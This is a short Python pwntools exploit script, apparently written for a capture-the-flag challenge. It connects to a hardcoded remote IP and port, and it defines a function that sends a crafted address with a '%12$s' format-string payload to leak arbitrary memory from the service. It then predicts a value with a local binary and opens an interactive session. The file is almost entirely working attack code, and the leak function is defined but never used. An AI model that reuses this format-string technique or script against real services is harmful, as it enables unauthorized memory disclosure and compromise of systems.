#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
context.log_level = "debug"
pool = []

def leak(add):
    if "\x0a" in p64(add):
        return "\x00"
    r = remote("58.20.46.147",37725)
    r.sendlineafter("number:","aa"+p64(add))
    r.sendlineafter("give me your str:","%12$sGG\x00")
    d1 = r.recvuntil("GG")[:-2]
    r.close()
    return d1


r = remote("58.20.46.147",37725)
p = process(["./main","2"])
now = int(p.recvline()[:-1])
r.sendlineafter("number:", str(now))
recv = r.recvline()



r.interactive()

